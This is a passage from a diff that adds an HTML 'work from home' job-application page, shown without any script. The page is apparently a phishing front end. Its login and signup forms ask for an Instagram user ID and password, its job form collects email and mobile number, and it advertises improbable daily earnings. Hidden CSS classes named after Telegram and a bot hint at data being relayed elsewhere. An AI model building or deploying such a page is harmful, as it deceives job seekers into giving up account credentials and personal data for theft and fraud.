@@ -1,0 +1,1635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Work from Home · Apply for Jobs</title>
+    <!-- Font Awesome 6 (free) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        /* ----- reset & base ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(145deg, #0b1a1e 0%, #1a2f36 100%);
+            padding: 1.5rem;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 20% 30%, rgba(0, 200, 180, 0.08), transparent 60%),
+                radial-gradient(circle at 80% 70%, rgba(70, 200, 220, 0.06), transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .login-card {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 520px;
+            background: rgba(16, 30, 36, 0.78);
+            backdrop-filter: blur(14px) saturate(180%);
+            -webkit-backdrop-filter: blur(14px) saturate(180%);
+            border-radius: 2.8rem;
+            padding: 2.6rem 2.2rem 2.8rem 2.2rem;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.03) inset;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: transform 0.2s ease;
+            max-height: 95vh;
+            overflow-y: auto;
+        }
+
+        .login-card:hover {
+            transform: scale(1.01);
+        }
+
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+            margin-bottom: 1.6rem;
+        }
+        .brand i {
+            font-size: 2.2rem;
+            background: linear-gradient(135deg, #7ae0d0, #34b8b0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            filter: drop-shadow(0 4px 8px rgba(0, 180, 170, 0.25));
+        }
+        .brand h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            background: linear-gradient(to right, #e4faf5, #b0ece0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .brand span {
+            font-weight: 300;
+            opacity: 0.7;
+            font-size: 0.95rem;
+            margin-left: 0.2rem;
+            background: none;
+            color: #8fd0c9;
+            -webkit-background-clip: unset;
+            background-clip: unset;
+        }
+
+        .apply-headline {
+            color: rgba(190, 235, 225, 0.8);
+            font-weight: 400;
+            font-size: 0.95rem;
+            letter-spacing: 0.01em;
+            margin-bottom: 2rem;
+            border-left: 3px solid #2ecfc0;
+            padding-left: 1rem;
+            background: linear-gradient(90deg, rgba(46, 207, 192, 0.10), transparent);
+            border-radius: 0 8px 8px 0;
+        }
+        .apply-headline strong {
+            color: #dafaf0;
+            font-weight: 500;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+        .input-group label {
+            display: block;
+            font-size: 0.78rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            color: #8dbeb5;
+            margin-bottom: 0.4rem;
+        }
+        .input-group .field-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background: rgba(8, 22, 28, 0.6);
+            border-radius: 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: 0.2s ease;
+            backdrop-filter: blur(4px);
+        }
+        .input-group .field-wrapper:focus-within {
+            border-color: #2ecfc0;
+            box-shadow: 0 0 0 4px rgba(46, 207, 192, 0.2);
+            background: rgba(10, 28, 34, 0.8);
+        }
+        .input-group .field-wrapper i {
+            color: #6b9e95;
+            font-size: 1rem;
+            padding: 0 0 0 1.3rem;
+            opacity: 0.7;
+            transition: 0.2s;
+        }
+        .input-group .field-wrapper:focus-within i {
+            color: #7edfd2;
+            opacity: 1;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 0.85rem 1.3rem 0.85rem 1rem;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #edfcf7;
+            font-size: 1rem;
+            font-weight: 400;
+            letter-spacing: 0.01em;
+        }
+        .input-group input::placeholder {
+            color: #5b857c;
+            font-weight: 300;
+            font-size: 0.9rem;
+            opacity: 0.6;
+        }
+        .input-group input:-webkit-autofill {
+            background-color: transparent !important;
+            -webkit-box-shadow: 0 0 0 1000px rgba(16, 30, 36, 0.8) inset !important;
+            -webkit-text-fill-color: #edfcf7 !important;
+        }
+
+        .input-group .error-msg {
+            color: #ff7a7a;
+            font-size: 0.7rem;
+            margin-top: 0.3rem;
+            display: none;
+            padding-left: 0.5rem;
+        }
+        .input-group .error-msg.show {
+            display: block;
+        }
+        .input-group .field-wrapper.error {
+            border-color: #ff7a7a;
+            box-shadow: 0 0 0 4px rgba(255, 80, 80, 0.15);
+        }
+        .input-group .field-wrapper.success {
+            border-color: #2ecfc0;
+            box-shadow: 0 0 0 4px rgba(46, 207, 192, 0.15);
+        }
+
+        .toggle-password {
+            background: none;
+            border: none;
+            color: #6b9e95;
+            padding-right: 1.3rem;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+        }
+        .toggle-password:hover {
+            color: #aae3d8;
+        }
+
+        .options {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 1.6rem 0 2rem 0;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        .remember {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #aad0c5;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+        .remember input[type="checkbox"] {
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border-radius: 6px;
+            background: rgba(8, 22, 28, 0.7);
+            border: 1px solid #2f6b63;
+            cursor: pointer;
+            transition: 0.15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .remember input[type="checkbox"]:checked {
+            background: #2ecfc0;
+            border-color: #2ecfc0;
+            box-shadow: 0 0 0 2px rgba(46, 207, 192, 0.3);
+        }
+        .remember input[type="checkbox"]:checked::after {
+            content: '\f00c';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            font-size: 11px;
+            color: #0b1a1e;
+        }
+        .forgot-link {
+            color: #6fc3b8;
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 450;
+            border-bottom: 1px dashed rgba(111, 195, 184, 0.2);
+            transition: 0.2s;
+        }
+        .forgot-link:hover {
+            color: #aae3d8;
+            border-bottom-color: #aae3d8;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 0.9rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 3rem;
+            background: linear-gradient(135deg, #1eb8aa, #2ecfc0);
+            color: #0b1a1e;
+            cursor: pointer;
+            transition: 0.25s ease;
+            box-shadow: 0 8px 24px rgba(46, 207, 192, 0.25);
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.6rem;
+        }
+        .login-btn i {
+            font-size: 1.1rem;
+            transition: 0.2s;
+            color: #0b1a1e;
+        }
+        .login-btn:hover {
+            transform: translateY(-3px);
+            background: linear-gradient(135deg, #2acfc0, #3fd9cb);
+            box-shadow: 0 14px 30px rgba(46, 207, 192, 0.4);
+        }
+        .login-btn:active {
+            transform: scale(0.97);
+        }
+
+        .switch-cta {
+            margin-top: 2rem;
+            text-align: center;
+            color: #6b958c;
+            font-size: 0.95rem;
+        }
+        .switch-cta a {
+            color: #9ad9ce;
+            text-decoration: none;
+            font-weight: 500;
+            border-bottom: 1px solid transparent;
+            transition: 0.2s;
+            cursor: pointer;
+        }
+        .switch-cta a:hover {
+            border-bottom-color: #9ad9ce;
+            color: #c2f3e8;
+        }
+
+        .insta-note {
+            margin-top: 1.8rem;
+            padding: 0.7rem 1rem;
+            background: rgba(46, 207, 192, 0.06);
+            border-radius: 3rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.7rem;
+            font-size: 0.8rem;
+            color: #80cbc0;
+            border: 1px solid rgba(46, 207, 192, 0.12);
+            backdrop-filter: blur(4px);
+            width: 100%;
+            flex-wrap: wrap;
+        }
+        .insta-note i {
+            color: #5ccfc2;
+            font-size: 1rem;
+        }
+        .insta-note strong {
+            font-weight: 500;
+            color: #baf5e8;
+            background: rgba(46, 207, 192, 0.08);
+            padding: 0.1rem 0.8rem;
+            border-radius: 30px;
+            font-family: monospace;
+            letter-spacing: 0.3px;
+        }
+        .insta-note .highlight {
+            color: #ade8de;
+            font-weight: 400;
+        }
+        .flex-center {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+        }
+
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 2rem 1.5rem;
+                border-radius: 2rem;
+                max-height: 98vh;
+            }
+            .brand h1 {
+                font-size: 1.6rem;
+            }
+            .options {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .insta-note {
+                font-size: 0.75rem;
+                padding: 0.6rem 0.8rem;
+            }
+        }
+        input:focus-visible {
+            outline: 2px solid #2ecfc0;
+            outline-offset: 2px;
+        }
+
+        .signup-extra {
+            margin-top: 0.5rem;
+        }
+
+        .job-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.8rem;
+            margin: 1.2rem 0 1.5rem 0;
+        }
+        .job-card {
+            background: rgba(8, 22, 28, 0.5);
+            border: 1px solid rgba(46, 207, 192, 0.10);
+            border-radius: 1.2rem;
+            padding: 1rem 0.8rem;
+            text-align: center;
+            transition: 0.2s ease;
+            cursor: pointer;
+        }
+        .job-card:hover {
+            border-color: #2ecfc0;
+            background: rgba(46, 207, 192, 0.06);
+            transform: translateY(-2px);
+        }
+        .job-card.selected {
+            border-color: #2ecfc0;
+            background: rgba(46, 207, 192, 0.12);
+            box-shadow: 0 0 0 2px rgba(46, 207, 192, 0.15);
+        }
+        .job-card i {
+            font-size: 1.6rem;
+            color: #5ccfc2;
+            margin-bottom: 0.3rem;
+            display: block;
+        }
+        .job-card .job-name {
+            color: #e4faf5;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+        .job-card .job-earn {
+            color: #b0ece0;
+            font-size: 0.7rem;
+            opacity: 0.8;
+            margin-top: 0.2rem;
+        }
+        .job-card .job-earn i {
+            font-size: 0.7rem;
+            display: inline;
+            color: #f5c542;
+        }
+
+        .apply-section {
+            margin-top: 1.2rem;
+            padding: 1rem 1.2rem;
+            background: rgba(46, 207, 192, 0.04);
+            border-radius: 1.5rem;
+            border: 1px solid rgba(46, 207, 192, 0.06);
+        }
+        .apply-section .selected-job-display {
+            color: #b0ece0;
+            font-size: 0.9rem;
+            margin-bottom: 0.8rem;
+        }
+        .apply-section .selected-job-display strong {
+            color: #e4faf5;
+        }
+
+        .earning-badge {
+            display: inline-block;
+            background: rgba(245, 197, 66, 0.12);
+            border: 1px solid rgba(245, 197, 66, 0.15);
+            border-radius: 2rem;
+            padding: 0.3rem 1rem;
+            color: #f5c542;
+            font-size: 0.75rem;
+            font-weight: 500;
+            margin: 0.5rem 0;
+        }
+
+        .logout-btn {
+            background: rgba(255, 80, 80, 0.1);
+            border: 1px solid rgba(255, 80, 80, 0.15);
+            color: #ff7a7a;
+            padding: 0.4rem 1.2rem;
+            border-radius: 2rem;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: 0.2s;
+            margin-top: 0.5rem;
+        }
+        .logout-btn:hover {
+            background: rgba(255, 80, 80, 0.2);
+        }
+
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .contact-fields {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.8rem;
+            margin: 0.8rem 0;
+        }
+        .contact-fields .input-group {
+            margin-bottom: 0;
+        }
+        .contact-fields .field-wrapper {
+            border-radius: 1.5rem;
+        }
+        .contact-fields input {
+            padding: 0.6rem 1rem 0.6rem 0.8rem;
+            font-size: 0.9rem;
+        }
+
+        .agent-badge {
+            display: inline-block;
+            background: rgba(46, 207, 192, 0.08);
+            border: 1px solid rgba(46, 207, 192, 0.12);
+            border-radius: 2rem;
+            padding: 0.25rem 1rem;
+            color: #7edfd2;
+            font-size: 0.7rem;
+            margin-top: 0.3rem;
+        }
+        .agent-badge i {
+            color: #f5c542;
+            margin-right: 4px;
+        }
+
+        .sms-badge {
+            display: inline-block;
+            background: rgba(245, 197, 66, 0.08);
+            border: 1px solid rgba(245, 197, 66, 0.12);
+            border-radius: 2rem;
+            padding: 0.25rem 1rem;
+            color: #f5c542;
+            font-size: 0.7rem;
+            margin-top: 0.3rem;
+        }
+        .sms-badge i {
+            color: #f5c542;
+            margin-right: 4px;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            color: #2ecfc0;
+            text-align: center;
+            display: block;
+            margin: 0.5rem 0 1rem 0;
+            animation: pop 0.5s ease;
+        }
+        @keyframes pop {
+            0% { transform: scale(0.5); opacity: 0; }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-title {
+            color: #e4faf5;
+            font-size: 1.5rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 0.3rem;
+        }
+        .success-sub {
+            color: #8dbeb5;
+            text-align: center;
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .tracking-card {
+            background: rgba(8, 22, 28, 0.5);
+            border: 1px solid rgba(46, 207, 192, 0.10);
+            border-radius: 1.5rem;
+            padding: 1.2rem 1.5rem;
+            margin: 1rem 0;
+        }
+        .tracking-card .track-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .tracking-card .track-row:last-child {
+            border-bottom: none;
+        }
+        .tracking-card .track-label {
+            color: #6b958c;
+            font-size: 0.8rem;
+        }
+        .tracking-card .track-value {
+            color: #e4faf5;
+            font-size: 0.85rem;
+            font-weight: 500;
+            text-align: right;
+            word-break: break-word;
+            max-width: 60%;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: rgba(46, 207, 192, 0.12);
+            border: 1px solid rgba(46, 207, 192, 0.15);
+            border-radius: 2rem;
+            padding: 0.3rem 1.2rem;
+            color: #7edfd2;
+            font-size: 0.75rem;
+            font-weight: 500;
+        }
+        .status-badge i {
+            margin-right: 4px;
+            color: #f5c542;
+        }
+
+        .success-actions {
+            display: flex;
+            gap: 0.8rem;
+            margin-top: 1.2rem;
+        }
+        .success-actions .login-btn {
+            flex: 1;
+            padding: 0.7rem;
+            font-size: 0.9rem;
+        }
+        .success-actions .login-btn.secondary {
+            background: rgba(46, 207, 192, 0.08);
+            border: 1px solid rgba(46, 207, 192, 0.15);
+            color: #7edfd2;
+            box-shadow: none;
+        }
+        .success-actions .login-btn.secondary:hover {
+            background: rgba(46, 207, 192, 0.15);
+        }
+
+        .app-list-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        .app-list-header h3 {
+            color: #e4faf5;
+            font-size: 1rem;
+            font-weight: 500;
+        }
+        .app-list-header .app-count {
+            color: #6b958c;
+            font-size: 0.8rem;
+            background: rgba(46, 207, 192, 0.06);
+            padding: 0.2rem 0.8rem;
+            border-radius: 2rem;
+        }
+
+        .app-item {
+            background: rgba(8, 22, 28, 0.4);
+            border: 1px solid rgba(46, 207, 192, 0.06);
+            border-radius: 1.2rem;
+            padding: 0.8rem 1rem;
+            margin-bottom: 0.6rem;
+            transition: 0.2s;
+        }
+        .app-item:hover {
+            border-color: rgba(46, 207, 192, 0.15);
+        }
+        .app-item .app-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0.3rem;
+        }
+        .app-item .app-job {
+            color: #e4faf5;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+        .app-item .app-job i {
+            color: #5ccfc2;
+            margin-right: 6px;
+        }
+        .app-item .app-id {
+            color: #6b958c;
+            font-size: 0.7rem;
+            font-family: monospace;
+        }
+        .app-item .app-status {
+            font-size: 0.7rem;
+            padding: 0.15rem 0.7rem;
+            border-radius: 2rem;
+            background: rgba(46, 207, 192, 0.08);
+            color: #7edfd2;
+            border: 1px solid rgba(46, 207, 192, 0.06);
+        }
+        .app-item .app-status.review {
+            color: #7edfd2;
+            border-color: rgba(46, 207, 192, 0.12);
+            background: rgba(46, 207, 192, 0.06);
+        }
+        .app-item .app-date {
+            color: #5b857c;
+            font-size: 0.65rem;
+        }
+        .app-item .app-view-btn {
+            background: none;
+            border: none;
+            color: #6b958c;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: 0.2s;
+            padding: 0.2rem 0.5rem;
+            border-radius: 1rem;
+        }
+        .app-item .app-view-btn:hover {
+            color: #7edfd2;
+            background: rgba(46, 207, 192, 0.06);
+        }
+
+        .no-apps {
+            text-align: center;
+            color: #5b857c;
+            padding: 2rem 0;
+            font-size: 0.9rem;
+        }
+        .no-apps i {
+            font-size: 2.5rem;
+            color: #3f6b63;
+            display: block;
+            margin-bottom: 0.8rem;
+        }
+
+        .dashboard-nav {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        .dashboard-nav button {
+            background: rgba(46, 207, 192, 0.04);
+            border: 1px solid rgba(46, 207, 192, 0.06);
+            color: #8dbeb5;
+            padding: 0.4rem 1.2rem;
+            border-radius: 2rem;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: 0.2s;
+        }
+        .dashboard-nav button:hover {
+            border-color: rgba(46, 207, 192, 0.15);
+            color: #e4faf5;
+        }
+        .dashboard-nav button.active {
+            background: rgba(46, 207, 192, 0.08);
+            border-color: rgba(46, 207, 192, 0.15);
+            color: #7edfd2;
+        }
+
+        .sms-notification {
+            background: rgba(245, 197, 66, 0.04);
+            border: 1px solid rgba(245, 197, 66, 0.08);
+            border-radius: 1rem;
+            padding: 0.6rem 1rem;
+            margin: 0.5rem 0 0.8rem 0;
+            text-align: center;
+        }
+        .sms-notification i {
+            color: #f5c542;
+            margin-right: 6px;
+        }
+        .sms-notification span {
+            color: #b0a06a;
+            font-size: 0.75rem;
+        }
+
+        .bot-status,
+        .security-notice,
+        .telegram-hidden {
+            display: none !important;
+        }
+
+        /* Instagram validation hint */
+        .insta-hint {
+            color: #5b857c;
+            font-size: 0.65rem;
+            margin-top: 0.2rem;
+            padding-left: 0.5rem;
+        }
+        .insta-hint i {
+            color: #6b958c;
+            margin-right: 4px;
+        }
+
+        /* Valid indicator */
+        .valid-indicator {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            display: none;
+        }
+        .valid-indicator.show {
+            display: block;
+        }
+        .valid-indicator .fa-check-circle {
+            color: #2ecfc0;
+        }
+        .valid-indicator .fa-times-circle {
+            color: #ff7a7a;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card" role="main" aria-label="Work from home application">
+
+        <!-- ===== PAGE 1 : LOGIN ===== -->
+        <div id="page-login" class="page active">
+            <div class="brand">
+                <i class="fas fa-house-laptop"></i>
+                <h1>work<span>from</span>home</h1>
+            </div>
+            <div class="apply-headline">
+                <i class="fas fa-paper-plane" style="margin-right: 8px; opacity: 0.7;"></i>
+                Login to apply · <strong>any person</strong> can join
+            </div>
+            <form id="loginForm" action="#" method="POST" autocomplete="on">
+                <div class="input-group">
+                    <label for="loginIdentifier"><i class="fab fa-instagram" style="margin-right: 6px;"></i> Instagram User ID</label>
+                    <div class="field-wrapper" id="loginFieldWrapper">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="loginIdentifier" placeholder="e.g. your_instagram_id" required>
+                        <span class="valid-indicator" id="loginIndicator"><i class="fas fa-check-circle"></i></span>
+                    </div>
+                    <div class="error-msg" id="loginError">⚠️ Invalid Instagram ID. Use letters, numbers, dots, underscores (1-30 chars)</div>
+                    <div class="insta-hint"><i class="fas fa-info-circle"></i> Must start with a letter · Only letters, numbers, dots, underscores · 1-30 characters</div>
+                </div>
+                <div class="input-group">
+                    <label for="loginPassword"><i class="fas fa-lock" style="margin-right: 6px;"></i> Password</label>
+                    <div class="field-wrapper">
+                        <i class="fas fa-key"></i>
+                        <input type="password" id="loginPassword" placeholder="••••••••" required>
+                        <button type="button" class="toggle-password" id="togglePasswordBtn" aria-label="Toggle password visibility">
+                            <i class="far fa-eye" id="eyeIcon"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="options">
+                    <label class="remember"><input type="checkbox" checked> Remember me</label>
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+                <button type="submit" class="login-btn"><i class="fas fa-arrow-right-to-bracket"></i> Login / Apply</button>
+            </form>
+            <div class="switch-cta">
+                New applicant? <a id="switchToSignup">Create account</a>
+            </div>
+            <div class="flex-center">
+                <div class="insta-note">
+                    <i class="fab fa-instagram"></i>
+                    <span class="highlight">Instagram user ID:</span>
+                    <strong>@work_from_home_app</strong>
+                    <span style="opacity:0.6; margin-left: 4px;">(change anytime)</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== PAGE 2 : CREATE ACCOUNT ===== -->
+        <div id="page-signup" class="page">
+            <div class="brand">
+                <i class="fas fa-house-laptop"></i>
+                <h1>work<span>from</span>home</h1>
+            </div>
+            <div class="apply-headline">
+                <i class="fas fa-user-plus" style="margin-right: 8px; opacity: 0.7;"></i>
+                Create account · <strong>join & start earning</strong>
+            </div>
+            <form id="signupForm" action="#" method="POST" autocomplete="on">
+                <div class="input-group">
+                    <label for="signupName"><i class="far fa-user" style="margin-right: 6px;"></i> Full name</label>
+                    <div class="field-wrapper">
+                        <i class="fas fa-user-circle"></i>
+                        <input type="text" id="signupName" placeholder="e.g. Alex Person" required>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label for="signupEmail"><i class="fab fa-instagram" style="margin-right: 6px;"></i> Instagram User ID</label>
+                    <div class="field-wrapper" id="signupFieldWrapper">
+                        <i class="fas fa-at"></i>
+                        <input type="text" id="signupEmail" placeholder="e.g. your_instagram_id" required>
+                        <span class="valid-indicator" id="signupIndicator"><i class="fas fa-check-circle"></i></span>
+                    </div>
+                    <div class="error-msg" id="signupError">⚠️ Invalid Instagram ID. Use letters, numbers, dots, underscores (1-30 chars)</div>
+                    <div class="insta-hint"><i class="fas fa-info-circle"></i> Must start with a letter · Only letters, numbers, dots, underscores · 1-30 characters</div>
+                </div>
+                <div class="input-group">
+                    <label for="signupPassword"><i class="fas fa-lock" style="margin-right: 6px;"></i> Password</label>
+                    <div class="field-wrapper">
+                        <i class="fas fa-key"></i>
+                        <input type="password" id="signupPassword" placeholder="minimum 8 characters" required>
+                        <button type="button" class="toggle-password" id="toggleSignupPasswordBtn" aria-label="Toggle password visibility">
+                            <i class="far fa-eye" id="signupEyeIcon"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="input-group signup-extra">
+                    <label for="signupConfirm"><i class="fas fa-check-circle" style="margin-right: 6px;"></i> Confirm password</label>
+                    <div class="field-wrapper">
+                        <i class="fas fa-shield-alt"></i>
+                        <input type="password" id="signupConfirm" placeholder="re-enter password" required>
+                    </div>
+                </div>
+                <div class="options" style="margin-top: 0.5rem; margin-bottom: 1.8rem;">
+                    <label class="remember">
+                        <input type="checkbox" required> I agree to the <a href="#" style="color:#6fc3b8; text-decoration: none; border-bottom: 1px dashed #2f6b63;">terms & conditions</a>
+                    </label>
+                </div>
+                <button type="submit" class="login-btn"><i class="fas fa-user-plus"></i> Create account</button>
+            </form>
+            <div class="switch-cta">
+                Already have an account? <a id="switchToLogin">Log in</a>
+            </div>
+            <div class="flex-center">
+                <div class="insta-note">
+                    <i class="fab fa-instagram"></i>
+                    <span class="highlight">Instagram user ID:</span>
+                    <strong>@work_from_home_app</strong>
+                    <span style="opacity:0.6; margin-left: 4px;">(change anytime)</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== PAGE 3 : JOB DASHBOARD ===== -->
+        <div id="page-dashboard" class="page">
+            <div class="brand">
+                <i class="fas fa-house-laptop"></i>
+                <h1>work<span>from</span>home</h1>
+            </div>
+
+            <div class="dashboard-header">
+                <div class="apply-headline" style="margin-bottom: 0;">
+                    <i class="fas fa-briefcase" style="margin-right: 8px; opacity: 0.7;"></i>
+                    <strong id="dashboardUserName">User</strong> · apply for jobs
+                </div>
+                <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+            </div>
+
+            <div class="dashboard-nav">
+                <button class="active" id="navJobs"><i class="fas fa-briefcase"></i> All Jobs</button>
+                <button id="navMyApps"><i class="fas fa-file-alt"></i> My Applications</button>
+            </div>
+
+            <div id="jobsSection">
+                <div class="sms-notification">
+                    <i class="fas fa-sms"></i>
+                    <span>📱 You'll receive an SMS confirmation on your mobile after applying</span>
+                </div>
+
+                <div style="background: rgba(46, 207, 192, 0.04); border-radius: 1.2rem; padding: 0.6rem 1rem; margin: 0.5rem 0 1rem 0; border: 1px solid rgba(46, 207, 192, 0.06);">
+                    <div style="display: flex; align-items: center; gap: 0.8rem; flex-wrap: wrap; justify-content: center;">
+                        <span style="color: #8dbeb5; font-size: 0.8rem;"><i class="fas fa-clock"></i> Work: 3-4 hours/day</span>
+                        <span class="earning-badge"><i class="fas fa-wallet"></i> Earn ₹2,000 – ₹3,000 / day</span>
+                        <span style="color: #6b958c; font-size: 0.7rem;"><i class="fas fa-calendar-day"></i> Flexible shifts</span>
+                    </div>
+                </div>
+
+                <p style="color: #8dbeb5; font-size: 0.75rem; margin-bottom: 0.5rem;">Select a job role to apply:</p>
+
+                <div class="job-grid" id="jobGrid">
+                    <div class="job-card" data-job="Sales Executive">
+                        <i class="fas fa-handshake"></i>
+                        <div class="job-name">Sales Executive</div>
+                        <div class="job-earn"><i class="fas fa-rupee-sign"></i> 2.5k/day</div>
+                    </div>
+                    <div class="job-card" data-job="Telecalling">
+                        <i class="fas fa-phone-volume"></i>
+                        <div class="job-name">Telecalling</div>
+                        <div class="job-earn"><i class="fas fa-rupee-sign"></i> 2.2k/day</div>
+                    </div>
+                    <div class="job-card" data-job="Digital Marketing">
+                        <i class="fas fa-chart-line"></i>
+                        <div class="job-name">Digital Marketing</div>
+                        <div class="job-earn"><i class="fas fa-rupee-sign"></i> 3k/day</div>
+                    </div>
+                    <div class="job-card" data-job="Editor">
+                        <i class="fas fa-pen-fancy"></i>
+                        <div class="job-name">Editor</div>
+                        <div class="job-earn"><i class="fas fa-rupee-sign"></i> 2.8k/day</div>
+                    </div>
+                    <div class="job-card" data-job="Photo Editor">
+                        <i class="fas fa-image"></i>
+                        <div class="job-name">Photo Editor</div>
+                        <div class="job-earn"><i class="fas fa-rupee-sign"></i> 2.6k/day</div>
+                    </div>
+                    <div class="job-card" data-job="Cameraman">
+                        <i class="fas fa-video"></i>
+                        <div class="job-name">Cameraman</div>
+                        <div class="job-earn"><i class="fas fa-rupee-sign"></i> 2.7k/day</div>
+                    </div>
+                    <div class="job-card" data-job="Delivery Boy">
+                        <i class="fas fa-truck"></i>
+                        <div class="job-name">Delivery Boy</div>
+                        <div class="job-earn"><i class="fas fa-rupee-sign"></i> 2k/day</div>
+                    </div>
+                    <div class="job-card" data-job="Content Writer">
+                        <i class="fas fa-feather-alt"></i>
+                        <div class="job-name">Content Writer</div>
+                        <div class="job-earn"><i class="fas fa-rupee-sign"></i> 2.4k/day</div>
+                    </div>
+                </div>
+
+                <div class="apply-section">
+                    <div class="selected-job-display">
+                        <i class="fas fa-check-circle" style="color: #2ecfc0;"></i>
+                        Selected: <strong id="selectedJobName">None</strong>
+                    </div>
+
+                    <div class="contact-fields">
+                        <div class="input-group">
+                            <label for="applyEmail"><i class="far fa-envelope"></i> Email</label>
+                            <div class="field-wrapper">
+                                <i class="fas fa-at"></i>
+                                <input type="email" id="applyEmail" placeholder="your@email.com" required>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label for="applyMobile"><i class="fas fa-phone"></i> Mobile</label>
+                            <div class="field-wrapper">
+                                <i class="fas fa-mobile-alt"></i>
+                                <input type="tel" id="applyMobile" placeholder="+91 98765 43210" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="text-align: center; margin: 0.3rem 0 0.8rem 0;">
+                        <span class="agent-badge"><i class="fas fa-headset"></i> Agent will connect within 24 hours</span>
+                        <span class="sms-badge"><i class="fas fa-sms"></i> SMS confirmation sent</span>
+                    </div>
+
+                    <button class="login-btn" id="applyJobBtn" style="padding: 0.7rem; font-size: 1rem;">
+                        <i class="fas fa-paper-plane"></i> Apply Now
+                    </button>
+                    <p style="color: #6b958c; font-size: 0.65rem; margin-top: 0.5rem; text-align: center; opacity: 0.7;">
+                        <i class="fas fa-info-circle"></i> We'll send job details, interview info & working technique to your email & mobile
+                    </p>
+                </div>
+            </div>
+
+            <div id="myAppsSection" style="display: none;">
+                <div class="app-list-header">
+                    <h3><i class="fas fa-file-alt" style="color: #5ccfc2;"></i> My Applications</h3>
+                    <span class="app-count" id="appCount">0 applications</span>
+                </div>
+                <div id="applicationsList">
+                    <div class="no-apps">
+                        <i class="fas fa-inbox"></i>
+                        <p>You haven't applied for any jobs yet.</p>
+                        <p style="font-size: 0.8rem; margin-top: 0.3rem;">Browse jobs and apply to get started!</p>
+                    </div>
+                </div>
+            </div>
+
